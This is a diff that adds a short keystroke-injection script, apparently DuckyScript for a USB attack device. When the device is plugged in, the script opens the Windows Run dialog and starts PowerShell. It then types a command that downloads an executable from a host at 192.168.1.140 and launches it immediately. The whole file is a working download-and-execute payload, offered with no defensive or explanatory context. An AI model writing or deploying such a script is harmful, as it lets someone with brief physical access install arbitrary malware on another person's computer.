@@ -1,0 +1,7 @@
+DELAY 5000
+GUI R
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING Invoke-WebRequest -Uri http://192.168.1.140:3232/4ac5d816227cbfba9580a510af5272e2 -OutFile test.exe; Start-Process .\test.exe
